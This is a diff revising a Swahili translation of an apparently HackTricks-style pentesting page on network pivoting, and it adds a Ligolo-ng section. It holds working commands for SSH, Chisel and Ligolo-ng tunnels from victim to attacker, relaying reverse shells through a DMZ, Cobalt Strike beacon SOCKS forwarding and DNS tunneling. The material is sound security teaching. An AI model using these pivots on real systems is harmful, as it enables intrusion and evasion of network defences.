@@ -65,7 +65,7 @@ sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 ```
 ### Port2hostnet (proxychains)
 
-Porti za ndani --> Kituo kilichovunjwa (SSH) --> Popote
+Porti za ndani --> Kihosti kilichoshambuliwa (SSH) --> Popote
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
@@ -74,7 +74,7 @@ ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port
 Hii ni muhimu kupata reverse shells kutoka kwa mwenyeji wa ndani kupitia DMZ hadi mwenyeji wako:
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
-# Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
+# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
 # Note that port 443 must be open
 # Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
 # and change the line "GatewayPorts no" to "GatewayPorts yes"
@@ -118,7 +118,7 @@ sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 
 ### Port2Port
 
-Bandari ya ndani --> Kituo kilichoshambuliwa (kipindi kinachofanya kazi) --> Sanduku\_tatu:Bandari
+Porti za ndani --> Kituo kilichoshambuliwa (sehemu inayofanya kazi) --> Sanduku\_tatu:Port
 ```bash
 # Inside a meterpreter session
 portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
@@ -148,7 +148,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS proxy
 
-Fungua bandari katika server ya timu inayosikiliza katika interfaces zote ambazo zinaweza kutumika **kuelekeza trafiki kupitia beacon**.
+Fungua bandari katika teamserver inayosikiliza katika interfaces zote ambazo zinaweza kutumika **kuelekeza trafiki kupitia beacon**.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -167,14 +167,14 @@ rportfwd stop [bind port]
 ```
 To note:
 
-- Reverse port forward ya Beacon imeundwa ili **kufanya tunneling ya trafiki kwa Team Server, sio kwa kuhamasisha kati ya mashine binafsi**.
-- Trafiki **inafanywa tunneling ndani ya trafiki ya C2 ya Beacon**, ikiwa ni pamoja na viungo vya P2P.
-- **Haki za admin hazihitajiki** kuunda reverse port forwards kwenye port za juu.
+- Reverse port forward ya Beacon imeundwa ili **kupeleka trafiki kwa Team Server, sio kwa kuhamasisha kati ya mashine binafsi**.
+- Trafiki **inaelekezwa ndani ya trafiki ya C2 ya Beacon**, ikiwa ni pamoja na viungo vya P2P.
+- **Haki za Admin hazihitajiki** kuunda reverse port forwards kwenye bandari za juu.
 
 ### rPort2Port local
 
 {% hint style="warning" %}
-Katika kesi hii, **port imefunguliwa katika mwenyeji wa beacon**, sio katika Team Server na **trafiki inatumwa kwa mteja wa Cobalt Strike** (sio kwa Team Server) na kutoka hapo kwa mwenyeji:port iliyoonyeshwa.
+Katika kesi hii, **bandari imefunguliwa kwenye mwenyeji wa beacon**, sio kwenye Team Server na **trafiki inatumwa kwa mteja wa Cobalt Strike** (sio kwa Team Server) na kutoka hapo kwenda kwenye mwenyeji:bandari iliyoonyeshwa.
 {% endhint %}
 ```
 rportfwd_local [bind port] [forward host] [forward port]
@@ -202,10 +202,46 @@ Unahitaji kutumia **toleo sawa kwa mteja na seva**
 ./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
 ./chisel client -v 10.10.10.10:8080 socks #Attacker
 ```
-### Uhamasishaji wa bandari
+### Uelekezaji wa bandari
 ```bash
 ./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
 ./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
+```
+## Ligolo-ng
+
+[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)
+
+**Tumia toleo sawa kwa wakala na proxy**
+
+### Tunneling
+```bash
+# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
+sudo ./proxy -selfcert
+# Create an interface named "ligolo" -- Attacker
+interface_create --name "ligolo"
+# Print the currently used certificate fingerprint -- Attacker
+certificate_fingerprint
+# Start the agent with certification validation -- Victim
+./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
+# Select the agent -- Attacker
+session
+1
+# Start the tunnel on the proxy server -- Attacker
+tunnel_start --tun "ligolo"
+# Display the agent's network configuration -- Attacker
+ifconfig
+# Create a route to the agent's specified network -- Attacker
+interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
+# Display the tun interfaces -- Attacker
+interface_list
+```
+### Ufunguo wa Wakala na Kusikiliza
+```bash
+# Establish a tunnel from the proxy server to the agent
+# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
+listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
+# Display the currently running listeners on the agent -- Attacker
+listener_list
 ```
 ## Rpivot
 
@@ -317,13 +353,13 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ```
 ## SocksOverRDP & Proxifier
 
-Unahitaji kuwa na **ufikiaji wa RDP juu ya mfumo**.\
+Unahitaji kuwa na **RDP access juu ya mfumo**.\
 Pakua:
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Chombo hiki kinatumia `Dynamic Virtual Channels` (`DVC`) kutoka kwa kipengele cha Huduma ya Desktop ya KijRemote ya Windows. DVC inawajibika kwa **kuchora pakiti juu ya muunganisho wa RDP**.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Chombo hiki kinatumia `Dynamic Virtual Channels` (`DVC`) kutoka kwa kipengele cha Remote Desktop Service cha Windows. DVC inawajibika kwa **tunneling packets juu ya RDP connection**.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
-Katika kompyuta yako ya mteja, pakia **`SocksOverRDP-Plugin.dll`** kama ifuatavyo:
+Katika kompyuta yako ya mteja pakia **`SocksOverRDP-Plugin.dll`** kama ifuatavyo:
 ```bash
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
@@ -338,18 +374,18 @@ Sasa, thibitisha kwenye mashine yako (mshambuliaji) kwamba bandari 1080 inasikil
 ```
 netstat -antb | findstr 1080
 ```
-Sasa unaweza kutumia [**Proxifier**](https://www.proxifier.com/) **kupeleka trafiki kupitia bandari hiyo.**
+Now you can use [**Proxifier**](https://www.proxifier.com/) **kupanua trafiki kupitia bandari hiyo.**
 
 ## Proxify Windows GUI Apps
 
-Unaweza kufanya programu za Windows GUI zipitie proxy kwa kutumia [**Proxifier**](https://www.proxifier.com/).\
-Katika **Profile -> Proxy Servers** ongeza IP na bandari ya seva ya SOCKS.\
-Katika **Profile -> Proxification Rules** ongeza jina la programu ya kupeleka na muunganisho kwa IP unazotaka kupeleka.
+You can make Windows GUI apps navigate through a proxy using [**Proxifier**](https://www.proxifier.com/).\
+In **Profile -> Proxy Servers** add the IP and port of the SOCKS server.\
+In **Profile -> Proxification Rules** add the name of the program to proxify and the connections to the IPs you want to proxify.
 
 ## NTLM proxy bypass
 
-Kifaa kilichotajwa hapo awali: **Rpivot**\
-**OpenVPN** pia kinaweza kupita, kuweka chaguzi hizi katika faili la usanidi:
+The previously mentioned tool: **Rpivot**\
+**OpenVPN** can also bypass it, setting these options in the configuration file:
 ```bash
 http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 ```
@@ -357,8 +393,8 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Inathibitisha dhidi ya proxy na inafunga bandari kwa ndani ambayo inapelekwa kwa huduma ya nje unayoelekeza. Kisha, unaweza kutumia chombo chochote unachokipenda kupitia bandari hii.\
-Kwa mfano, inapeleka bandari 443
+Inathibitisha dhidi ya proxy na inafunga bandari kwa ndani ambayo inasambazwa kwa huduma ya nje unayoelekeza. Kisha, unaweza kutumia chombo chochote unachokipenda kupitia bandari hii.\
+Kwa mfano, inasambaza bandari 443
 ```
 Username Alice
 Password P@ssw0rd
@@ -379,7 +415,7 @@ Proxy ya kurudi iliyoundwa na Microsoft. Unaweza kuipata hapa: [https://github.c
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-Root inahitajika katika mifumo yote miwili ili kuunda tun adapters na kupitisha data kati yao kwa kutumia maswali ya DNS.
+Root inahitajika katika mifumo yote ili kuunda tun adapters na kupitisha data kati yao kwa kutumia maswali ya DNS.
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
@@ -458,7 +494,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 
 ### Usanidi
 
-- Tengeneza akaunti: https://ngrok.com/signup
+- Unda akaunti: https://ngrok.com/signup
 - Pakua mteja:
 ```bash
 tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
@@ -472,7 +508,7 @@ chmod a+x ./ngrok
 
 *Pia inawezekana kuongeza uthibitisho na TLS, ikiwa ni lazima.*
 
-#### Kuingiza TCP
+#### Tunneling TCP
 ```bash
 # Pointing to 0.0.0.0:4444
 ./ngrok tcp 4444
@@ -514,7 +550,7 @@ httpstatic:
 proto: http
 addr: file:///tmp/httpbin/
 ```
-## Vifaa vingine vya kuangalia
+## Zana nyingine za kuangalia
 
 * [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
 * [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
